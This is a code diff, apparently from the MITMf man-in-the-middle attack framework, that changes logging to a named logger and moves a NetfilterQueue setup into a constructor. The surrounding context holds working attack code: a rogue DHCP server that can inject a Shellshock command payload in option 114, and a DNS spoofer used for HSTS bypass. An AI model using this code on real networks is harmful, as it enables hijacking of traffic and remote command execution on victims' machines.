@@ -32,6 +32,8 @@ from netfilterqueue import NetfilterQueue
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
 from scapy.all import *
 
+mitmf_logger = logging.getLogger('mitmf')
+
 class _DHCP():
 
 	def __init__(self, interface, dhcpcfg, ip, mac):
@@ -79,8 +81,8 @@ class _DHCP():
 				self.dhcp_dic[xid] = client_ip
 
 			if resp[DHCP].options[0][1] is 1:
-				logging.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
-				logging.info("Sending DHCP OFFER")
+				mitmf_logger.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
+				mitmf_logger.info("Sending DHCP OFFER")
 				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
 				IP(src=self.ip_address, dst='255.255.255.255') /
 				UDP(sport=67, dport=68) /
@@ -102,7 +104,7 @@ class _DHCP():
 				sendp(packet, iface=self.interface, verbose=self.debug)
 
 			if resp[DHCP].options[0][1] is 3:
-				logging.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
+				mitmf_logger.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
 				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
 				IP(src=self.ip_address, dst='255.255.255.255') /
 				UDP(sport=67, dport=68) /
@@ -121,11 +123,11 @@ class _DHCP():
 					pass
 
 				if self.shellshock:
-					logging.info("Sending DHCP ACK with shellshock payload")
+					mitmf_logger.info("Sending DHCP ACK with shellshock payload")
 					packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
 					packet[DHCP].options.append("end")
 				else:
-					logging.info("Sending DHCP ACK")
+					mitmf_logger.info("Sending DHCP ACK")
 					packet[DHCP].options.append("end")
 
 				sendp(packet, iface=self.interface, verbose=self.debug)
@@ -250,10 +252,11 @@ class _DNS():
 	hstscfg   = None
 	dnscfg    = None
 	_instance = None
-	nfqueue   = NetfilterQueue()
+	nfqueue   = None
 	queue_number = 0
 
 	def __init__(self):
+		self.nfqueue = NetfilterQueue()
 		t = threading.Thread(name='nfqueue', target=self.bind, args=())
 		t.setDaemon(True)
 		t.start()
@@ -292,7 +295,7 @@ class _DNS():
 
 	def resolve_domain(self, domain):
 		try:
-			logging.debug("Resolving -> %s" % domain)
+			mitmf_logger.debug("Resolving -> %s" % domain)
 			answer = dns.resolver.query(domain, 'A')
 			real_ips = []
 			for rdata in answer:
@@ -302,11 +305,11 @@ class _DNS():
 				return real_ips
 
 		except Exception:
-			logging.info("Error resolving " + domain)
+			mitmf_logger.info("Error resolving " + domain)
 
 	def callback(self, payload):
 		try:
-			#logging.debug(payload)
+			#mitmf_logger.debug(payload)
 			pkt = IP(payload.get_payload())
 
 			if not pkt.haslayer(DNSQR):
@@ -314,7 +317,7 @@ class _DNS():
 				return
 
 			if pkt.haslayer(DNSQR):
-				logging.debug("Got DNS packet for %s %s" % (pkt[DNSQR].qname, pkt[DNSQR].qtype))
+				mitmf_logger.debug("Got DNS packet for %s %s" % (pkt[DNSQR].qname, pkt[DNSQR].qtype))
 				if self.dns:
 					for k, v in self.dnscfg.items():
 						if k in pkt[DNSQR].qname:
@@ -359,13 +362,13 @@ class _DNS():
 				spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip[0]); del ip[0] #have to do this first to initialize the an field
 				for i in ip:
 					spoofed_pkt[DNS].an.add_payload(DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=i))
-				logging.info("%s Resolving %s for HSTS bypass (DNS)" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
+				mitmf_logger.info("%s Resolving %s for HSTS bypass (DNS)" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
 				payload.set_payload(str(spoofed_pkt))
 				payload.accept()
 
 			if self.dns:
 				spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip) 
-				logging.info("%s Modified DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
+				mitmf_logger.info("%s Modified DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
 				payload.set_payload(str(spoofed_pkt))
 				payload.accept()
 		
